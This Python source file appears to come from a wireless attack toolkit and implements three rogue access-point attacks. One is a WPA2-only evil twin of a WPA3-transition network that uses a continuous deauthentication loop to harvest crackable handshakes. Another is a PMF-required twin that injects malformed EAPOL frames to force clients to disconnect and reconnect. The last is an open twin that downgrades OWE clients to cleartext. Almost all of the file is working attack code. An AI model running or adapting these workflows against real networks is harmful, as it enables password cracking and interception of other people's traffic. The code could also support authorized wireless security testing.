"""Portal-free rogue-AP attack workflows.

This module hosts the three remaining rogue-AP chains:

* ``run_downgrade_twin()`` — a WPA2-only twin of a WPA3-transition AP.
* ``run_pmf_bypass_chain()`` — a PMF-required twin used to deliver the
  malformed-Message-1/4 PMF-bypass primitive and capture the reconnect.
* ``run_owe_downgrade()`` — an open twin of an OWE transition-mode network.

None of these workflows serves a captive portal or collects submitted WiFi
credentials. External dependencies are hostapd, iproute2, and — only for the
OWE workflow — dnsmasq.
"""

from __future__ import annotations

import os
import re
import secrets
import signal
import string
import subprocess
import tempfile
import textwrap
import threading
import time
from dataclasses import dataclass

from ..frames import BROADCAST
from .deauth import deauth as _deauth
from .handshake import HandshakeStatus
from .handshake import capture_handshake as _capture_handshake

# ── constants ────────────────────────────────────────────────────────────────

_AP_IP = "10.0.0.1"
_AP_NETWORK = "10.0.0.0/24"
_DHCP_RANGE_START = "10.0.0.10"
_DHCP_RANGE_END = "10.0.0.50"
_CMD_TIMEOUT = 8          # seconds for bounded ip/hostapd helper commands
_HOSTAPD_START_WAIT = 5  # seconds to wait for hostapd to come up
_DNSMASQ_START_WAIT = 2


# ── result type ──────────────────────────────────────────────────────────────

@dataclass
class DowngradeTwinResult:
    """Outcome of a run_downgrade_twin() call."""
    status: HandshakeStatus = HandshakeStatus.NONE
    outfile: str | None = None
    elapsed: float = 0.0
    detail: str = ""


@dataclass
class OweDowngradeResult:
    """Outcome of a run_owe_downgrade() call."""
    success: bool = False
    client_mac: str | None = None
    elapsed: float = 0.0
    detail: str = ""


@dataclass
class PmfBypassResult:
    """Outcome of a run_pmf_bypass_chain() call."""
    status: HandshakeStatus = HandshakeStatus.NONE
    outfile: str | None = None
    client_mac: str | None = None
    elapsed: float = 0.0
    detail: str = ""


# ── config builders ──────────────────────────────────────────────────────────

def _hostapd_ssid_line(ssid: str) -> str:
    """SSID as hostapd's `ssid2=` hex form instead of the plain-text
    `ssid=` directive. ssid= interpolates the raw bytes into the config,
    so an SSID containing a newline, '#', or leading space corrupts the
    file -- or injects extra config lines (it's attacker-visible data
    from a beacon, not trusted input). ssid2= takes the SSID as hex
    digits, which can express any byte sequence and nothing else."""
    return f"ssid2={ssid.encode('utf-8', errors='surrogateescape').hex()}"


def _hostapd_conf(iface: str, ssid: str, channel: int) -> str:
    return textwrap.dedent(f"""\
        interface={iface}
        driver=nl80211
        {_hostapd_ssid_line(ssid)}
        hw_mode=g
        channel={channel if channel <= 13 else 6}
        ignore_broadcast_ssid=0
        auth_algs=1
        wpa=0
    """)


def _hostapd_conf_wpa2(iface: str, ssid: str, channel: int, passphrase: str, require_pmf: bool = False) -> str:
    """WPA2-PSK variant for downgrade_twin -- the passphrase is a throwaway
    placeholder, never the target network's real one. hostapd requires
    SOME valid 8-63 char passphrase to run in WPA-PSK mode at all, but we
    never need it to actually validate: a client auto-reconnecting with
    its own real (different) password still completes Message 1/2 of the
    4-way handshake using a PMK derived from ITS real password before
    hostapd's own MIC check on Message 2 fails and rejects it -- that
    M1+M2 pair, captured independently by capture_handshake() on iface_mon,
    is exactly the crackable CHALLENGE-status material this attack exists
    to harvest (see attacks/handshake.py's HandshakeStatus docstring).

    require_pmf (default False): set ieee80211w=2 (PMF required) -- used
    by run_pmf_bypass_chain(), which needs a PMF-required rogue twin for
    attacks/pmf_bypass.py's malformed-Message-1/4 primitive to have a
    reason to exist at all (a non-PMF twin could just be told to
    disassociate the client normally)."""
    pmf_line = "ieee80211w=2\n" if require_pmf else ""
    return textwrap.dedent(f"""\
        interface={iface}
        driver=nl80211
        {_hostapd_ssid_line(ssid)}
        hw_mode=g
        channel={channel if channel <= 13 else 6}
        ignore_broadcast_ssid=0
        auth_algs=1
        wpa=2
        wpa_passphrase={passphrase}
        wpa_key_mgmt=WPA-PSK
        rsn_pairwise=CCMP
        {pmf_line}""")


def _random_passphrase(length: int = 32) -> str:
    """A throwaway hostapd WPA-PSK passphrase -- never the real network's
    password, just satisfies hostapd's own 8-63 char requirement."""
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))


def _dnsmasq_conf(iface: str) -> str:
    return textwrap.dedent(f"""\
        interface={iface}
        bind-interfaces
        dhcp-range={_DHCP_RANGE_START},{_DHCP_RANGE_END},12h
        dhcp-option=option:router,{_AP_IP}
        dhcp-option=option:dns-server,{_AP_IP}
        address=/#/{_AP_IP}
        log-dhcp
        no-resolv
        no-hosts
    """)


# ── subprocess helpers ────────────────────────────────────────────────────────

def _run(cmd: list[str], timeout: int = _CMD_TIMEOUT, check: bool = False) -> tuple[int, str]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=check)
        return r.returncode, (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return -1, f"timeout after {timeout}s"
    except FileNotFoundError:
        return -1, f"command not found: {cmd[0]}"


def _popen(cmd: list[str]) -> subprocess.Popen:
    return subprocess.Popen(
        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,  # noqa: PLW1509 - needed for process-group cleanup
    )


# ── interface setup / teardown ────────────────────────────────────────────────

def _assign_ip(iface: str) -> bool:
    _run(["ip", "addr", "flush", "dev", iface])
    rc, _out = _run(["ip", "addr", "add", f"{_AP_IP}/{24}", "dev", iface])
    if rc != 0:
        return False
    _run(["ip", "link", "set", iface, "up"])
    return True


def _flush_ip(iface: str) -> None:
    _run(["ip", "addr", "flush", "dev", iface])


def _station_dump(iface: str) -> list[str]:
    """MACs of stations currently associated to iface in AP mode, via
    `iw dev <iface> station dump`. Used by run_owe_downgrade() as the
    success signal instead of a DHCP lease -- L2 association alone is
    enough to prove the client downgraded to our open twin, even if it
    never actually requests an IP."""
    _rc, out = _run(["iw", "dev", iface, "station", "dump"])
    return re.findall(r"Station\s+([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", out)


# ── downgrade_twin: WPA3-transition rogue WPA2-only twin ──────────────────────

def run_downgrade_twin(
    iface_ap: str,
    iface_mon: str,
    bssid: str,
    ssid: str,
    channel: int,
    outfile: str,
    client: str = BROADCAST,
    timeout: float = 120.0,
    stop_event: threading.Event | None = None,
    progress_fn=None,
) -> DowngradeTwinResult:
    """Broadcast a WPA2-only rogue twin of a WPA3-transition-mode target,
    deauth clients off the real AP, and passively capture whatever 4-way
    handshake a client attempts against the twin using its own real
    password (see secure.py's downgrade_twin recommendation and
    _hostapd_conf_wpa2()'s docstring for why this needs no real
    passphrase to be useful).

    No DHCP, NAT, or captive portal: the 4-way handshake completes entirely
    before any IP is assigned. The attack's parameters are:
        iface_ap:  interface to bring up as the rogue AP.
        iface_mon: interface for both the deauth loop and the passive
            handshake listener -- monitor mode hears our own AP traffic
            fine, no second physical radio required.
        bssid:     the REAL AP's BSSID, used only for deauth targeting.
        outfile:   where to write the captured handshake pcap.
    """
    log = progress_fn or (lambda msg: None)
    stop = stop_event or threading.Event()
    t_start = time.monotonic()
    procs: list[subprocess.Popen] = []
    tmpfiles: list[str] = []

    def cleanup():
        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        for f in tmpfiles:
            try:
                os.unlink(f)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        _flush_ip(iface_ap)

    try:
        log(f"assigning IP to {iface_ap}")
        if not _assign_ip(iface_ap):
            log("failed to assign IP")
            return DowngradeTwinResult(detail="failed to assign IP to AP interface")

        ap_chan = channel if 1 <= channel <= 13 else 6
        passphrase = _random_passphrase()

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_hostapd_dt_", delete=False) as hconf:
            hconf.write(_hostapd_conf_wpa2(iface_ap, ssid, ap_chan, passphrase))
        tmpfiles.append(hconf.name)

        log(f"starting WPA2-only rogue twin on {iface_ap} (ssid={ssid!r}, channel={ap_chan})")
        hostapd_proc = _popen(["hostapd", hconf.name])
        procs.append(hostapd_proc)
        time.sleep(_HOSTAPD_START_WAIT)
        if hostapd_proc.poll() is not None:
            log("hostapd exited immediately")
            return DowngradeTwinResult(detail="hostapd exited immediately — check interface/driver")
        log("rogue twin up")

        from ..radio import get_mac
        try:
            rogue_bssid = get_mac(iface_ap)
        except Exception:  # noqa: BLE001 - reported to the caller below either way
            log("could not determine rogue twin's own BSSID — aborting")
            return DowngradeTwinResult(detail="could not determine rogue AP interface's MAC address")
        log(f"rogue twin BSSID: {rogue_bssid}")

        listen_result: dict = {}

        def _listen():
            listen_result["cap"] = _capture_handshake(
                iface_mon, rogue_bssid, channel=ap_chan, timeout=timeout,
                outfile=outfile, stop_event=stop, progress_fn=log,
            )

        listener = threading.Thread(target=_listen, daemon=True)
        listener.start()
        log(f"listening for a handshake against the rogue twin, writing to {outfile}")

        def _deauth_loop():
            round_n = 0
            while not stop.is_set():
                round_n += 1
                try:
                    sent = _deauth(iface_mon, bssid, client=client, channel=channel, progress_fn=log)
                    if sent == 0:
                        log(f"downgrade_twin deauth round {round_n}: did NOT go out to {bssid} — see the warning above")
                    else:
                        log(f"downgrade_twin deauth round {round_n}: sent {sent} deauth frame(s) to {bssid}")
                except Exception as exc:  # noqa: BLE001 - deauth loop must survive any one-round error
                    log(f"downgrade_twin deauth round {round_n} failed: {exc}")
                stop.wait(10.0)

        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        def _best_status() -> HandshakeStatus:
            cap = listen_result.get("cap")
            if cap is None or not cap.messages:
                return HandshakeStatus.NONE
            best = HandshakeStatus.NONE
            for a, c in cap.messages:
                status = cap.status(a, c)
                if status is HandshakeStatus.AUTHORIZED:
                    return HandshakeStatus.AUTHORIZED
                if status is HandshakeStatus.CHALLENGE:
                    best = HandshakeStatus.CHALLENGE
            return best

        log(f"waiting up to {timeout:.0f}s for a client to attempt the rogue twin")
        deadline = time.monotonic() + timeout
        best = HandshakeStatus.NONE
        while not stop.is_set() and time.monotonic() < deadline:
            best = _best_status()
            if best is not HandshakeStatus.NONE:
                break
            time.sleep(0.5)

        stop.set()
        listener.join(timeout=5)
        elapsed = time.monotonic() - t_start

        if best is HandshakeStatus.NONE:
            # listener.join() above guarantees listen_result["cap"] now
            # reflects its final state, catching the race between the
            # poll loop's last check and the listener thread actually
            # finishing.
            best = _best_status()

        if best is HandshakeStatus.NONE:
            log("no handshake captured against the rogue twin")
            return DowngradeTwinResult(elapsed=elapsed, detail="no client attempted the rogue twin")
        log(f"captured a {best.value} handshake against the rogue twin -> {outfile}")
        return DowngradeTwinResult(
            status=best, outfile=outfile, elapsed=elapsed,
            detail=f"{best.value} handshake captured (real password, unverified by us) -> {outfile}",
        )

    finally:
        stop.set()
        cleanup()


# ── pmf_bypass_chain: PMF-required rogue twin + forced-reconnect capture ───────

def run_pmf_bypass_chain(
    iface_ap: str,
    iface_mon: str,
    ssid: str,
    channel: int,
    outfile: str,
    client: str | None = None,
    key_info: str | None = None,
    assoc_timeout: float = 60.0,
    handshake_timeout: float = 60.0,
    stop_event: threading.Event | None = None,
    progress_fn=None,
) -> PmfBypassResult:
    """Evil-twin + PMF-bypass full attack chain: broadcast a rogue
    PMF-required WPA2-PSK twin, wait for a client to associate to it, then
    fire attacks/pmf_bypass.py's inject_pmf_bypass() at it -- a malformed
    Message 1/4 that crashes some clients' own handshake parsing and forces
    a disconnect through a path PMF can't protect (it's an unencrypted
    EAPOL-Key frame, not a management frame, so 802.11w never gets a
    chance to block it; see pmf_bypass.py's module docstring, including
    its scope caveat: this only works against a client already associated
    to an AP we control, which is exactly the role this rogue twin plays).
    The disconnected client reconnecting to what still looks like the same
    AP redoes the 4-way handshake, captured by capture_handshake() on
    iface_mon the same way every other twin variant in this module does.

    This is what delivers attacks/pmf_bypass.py's frame-construction
    primitive through a real attack surface -- until this function
    existed, that module was documented as "ready to be wired into that
    flow once it exists". secure.py's downgrade_twin (built independently
    since that docstring was written) doesn't need this: its rogue twin
    isn't PMF-required, so a plain deauth already works there. PMF bypass
    only earns its keep against a PMF-required twin, where normal
    deauth/disassoc frames would be dropped.

    client: target this specific client MAC once it associates; None
    (default) acts on whichever client shows up first in _station_dump().
    key_info: forwarded to inject_pmf_bypass() -- None (default) uses that
    function's own default (KEY_INFO_WPA3_PMF).
    """
    from .pmf_bypass import inject_pmf_bypass

    log = progress_fn or (lambda msg: None)
    stop = stop_event or threading.Event()
    t_start = time.monotonic()
    procs: list[subprocess.Popen] = []
    tmpfiles: list[str] = []

    def cleanup():
        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        for f in tmpfiles:
            try:
                os.unlink(f)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        _flush_ip(iface_ap)

    try:
        log(f"assigning IP to {iface_ap}")
        if not _assign_ip(iface_ap):
            log("failed to assign IP")
            return PmfBypassResult(detail="failed to assign IP to AP interface")

        ap_chan = channel if 1 <= channel <= 13 else 6
        passphrase = _random_passphrase()

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_hostapd_pmfbp_", delete=False) as hconf:
            hconf.write(_hostapd_conf_wpa2(iface_ap, ssid, ap_chan, passphrase, require_pmf=True))
        tmpfiles.append(hconf.name)

        log(f"starting PMF-required rogue twin on {iface_ap} (ssid={ssid!r}, channel={ap_chan})")
        hostapd_proc = _popen(["hostapd", hconf.name])
        procs.append(hostapd_proc)
        time.sleep(_HOSTAPD_START_WAIT)
        if hostapd_proc.poll() is not None:
            log("hostapd exited immediately")
            return PmfBypassResult(detail="hostapd exited immediately — check interface/driver")
        log("rogue twin up")

        from ..radio import get_mac
        try:
            rogue_bssid = get_mac(iface_ap)
        except Exception:  # noqa: BLE001 - reported to the caller below either way
            log("could not determine rogue twin's own BSSID — aborting")
            return PmfBypassResult(detail="could not determine rogue AP interface's MAC address")
        log(f"rogue twin BSSID: {rogue_bssid}")

        log(f"waiting up to {assoc_timeout:.0f}s for a client to associate to the rogue twin")
        target_client = client
        found = False
        deadline = time.monotonic() + assoc_timeout
        while time.monotonic() < deadline:
            stations = _station_dump(iface_ap)
            if target_client is not None:
                if target_client in stations:
                    found = True
                    break
            elif stations:
                target_client = stations[0]
                found = True
                break
            if stop.wait(1.0):
                return PmfBypassResult(elapsed=time.monotonic() - t_start, detail="stopped before a client associated")

        if not found:
            log("no client associated to the rogue twin in time")
            return PmfBypassResult(elapsed=time.monotonic() - t_start, detail="no client associated to the rogue twin")
        assert target_client is not None  # guaranteed by found=True above

        log(f"client {target_client} associated -- listening for its next handshake, then forcing a disconnect")
        listen_result: dict = {}

        def _listen():
            listen_result["cap"] = _capture_handshake(
                iface_mon, rogue_bssid, channel=ap_chan, timeout=handshake_timeout,
                outfile=outfile, stop_event=stop, progress_fn=log,
            )

        listener = threading.Thread(target=_listen, daemon=True)
        listener.start()
        time.sleep(1.0)  # let the listener's sniffer settle before disrupting the client

        log(f"sending PMF-bypass malformed Message 1/4 to {target_client}")
        try:
            if key_info is not None:
                inject_pmf_bypass(iface_mon, rogue_bssid, target_client, key_info=key_info)
            else:
                inject_pmf_bypass(iface_mon, rogue_bssid, target_client)
        except Exception as exc:  # noqa: BLE001 - the listener may still catch a handshake even if this fails
            log(f"PMF-bypass injection failed: {exc}")

        log(f"waiting up to {handshake_timeout:.0f}s for {target_client} to reconnect and redo the handshake")
        listener.join(timeout=handshake_timeout + 5)
        elapsed = time.monotonic() - t_start

        cap = listen_result.get("cap")
        best = HandshakeStatus.NONE
        if cap is not None and cap.messages:
            for a, c in cap.messages:
                status = cap.status(a, c)
                if status is HandshakeStatus.AUTHORIZED:
                    best = HandshakeStatus.AUTHORIZED
                    break
                if status is HandshakeStatus.CHALLENGE:
                    best = HandshakeStatus.CHALLENGE

        if best is HandshakeStatus.NONE:
            log(f"no handshake captured from {target_client} after the forced disconnect")
            return PmfBypassResult(
                client_mac=target_client, elapsed=elapsed,
                detail=f"{target_client} did not reconnect (or its stack ignored the malformed frame)",
            )
        log(f"captured a {best.value} handshake from {target_client} after the forced disconnect -> {outfile}")
        return PmfBypassResult(
            status=best, outfile=outfile, client_mac=target_client, elapsed=elapsed,
            detail=f"{best.value} handshake captured after PMF-bypass-forced reconnect -> {outfile}",
        )

    finally:
        stop.set()
        cleanup()


# ── owe_downgrade: OWE-transition rogue OPEN twin ──────────────────────────────

def run_owe_downgrade(
    iface_ap: str,
    iface_mon: str,
    owe_bssid: str,
    open_ssid: str,
    channel: int,
    client: str = BROADCAST,
    timeout: float = 120.0,
    stop_event: threading.Event | None = None,
    progress_fn=None,
) -> OweDowngradeResult:
    """OWE (Enhanced Open) transition-mode downgrade: broadcast the target's
    own already-advertised paired open network (open_ssid, discovered via
    secure.owe_transition_info()) as our own rogue AP, and deauth clients
    off the REAL OWE bssid so they fall back to it.

    There's nothing to harvest here -- OWE has no password, and this rogue twin is open, not
    WPA2-PSK -- the whole point of OWE-transition mode downgrade is that
    a client's traffic goes back to cleartext the moment it associates.
    Success is simply a client associating (checked via `iw ... station
    dump`, not a DHCP lease, since L2 association alone already proves
    the downgrade regardless of whether the client ever requests an IP).
    No captive portal -- there's no password to collect.

    Parameters:
        owe_bssid: the REAL OWE BSSID -- used only for deauth targeting.
        open_ssid: the paired open network's SSID (from the transition
            IE), broadcast by our rogue AP.
    """
    log = progress_fn or (lambda msg: None)
    stop = stop_event or threading.Event()
    t_start = time.monotonic()
    procs: list[subprocess.Popen] = []
    tmpfiles: list[str] = []

    def cleanup():
        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        for f in tmpfiles:
            try:
                os.unlink(f)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        _flush_ip(iface_ap)

    try:
        log(f"assigning IP to {iface_ap}")
        if not _assign_ip(iface_ap):
            log("failed to assign IP")
            return OweDowngradeResult(detail="failed to assign IP to AP interface")

        ap_chan = channel if 1 <= channel <= 13 else 6

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_hostapd_owe_", delete=False) as hconf:
            hconf.write(_hostapd_conf(iface_ap, open_ssid, ap_chan))
        tmpfiles.append(hconf.name)

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_dnsmasq_owe_", delete=False) as dconf:
            dconf.write(_dnsmasq_conf(iface_ap))
        tmpfiles.append(dconf.name)

        log(f"starting open rogue twin on {iface_ap} (ssid={open_ssid!r}, channel={ap_chan})")
        hostapd_proc = _popen(["hostapd", hconf.name])
        procs.append(hostapd_proc)
        time.sleep(_HOSTAPD_START_WAIT)
        if hostapd_proc.poll() is not None:
            log("hostapd exited immediately")
            return OweDowngradeResult(detail="hostapd exited immediately — check interface/driver")
        log("rogue twin up")

        log("starting dnsmasq (DHCP/DNS for rogue AP)")
        dns_proc = _popen(["dnsmasq", "--no-daemon", f"--conf-file={dconf.name}"])
        procs.append(dns_proc)
        time.sleep(_DNSMASQ_START_WAIT)
        log("dnsmasq up")

        def _deauth_loop():
            round_n = 0
            while not stop.is_set():
                round_n += 1
                try:
                    sent = _deauth(iface_mon, owe_bssid, client=client, channel=channel, progress_fn=log)
                    if sent == 0:
                        log(f"owe_downgrade deauth round {round_n}: did NOT go out to {owe_bssid} — see the warning above")
                    else:
                        log(f"owe_downgrade deauth round {round_n}: sent {sent} deauth frame(s) to {owe_bssid}")
                except Exception as exc:  # noqa: BLE001 - deauth loop must survive any one-round error
                    log(f"owe_downgrade deauth round {round_n} failed: {exc}")
                stop.wait(10.0)

        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        log(f"waiting up to {timeout:.0f}s for a client to associate to the open twin")
        deadline = time.monotonic() + timeout
        associated: str | None = None
        while not stop.is_set() and time.monotonic() < deadline:
            stations = _station_dump(iface_ap)
            if stations:
                associated = stations[0]
                break
            time.sleep(1.0)

        stop.set()
        elapsed = time.monotonic() - t_start

        if associated is None:
            log("no client associated with the open twin")
            return OweDowngradeResult(elapsed=elapsed, detail="no client associated with the open twin")
        log(f"client {associated} associated with the open twin -> downgraded to cleartext")
        return OweDowngradeResult(
            success=True, client_mac=associated, elapsed=elapsed,
            detail=f"client {associated} downgraded to open (cleartext) after {elapsed:.0f}s",
        )

    finally:
        stop.set()
        cleanup()
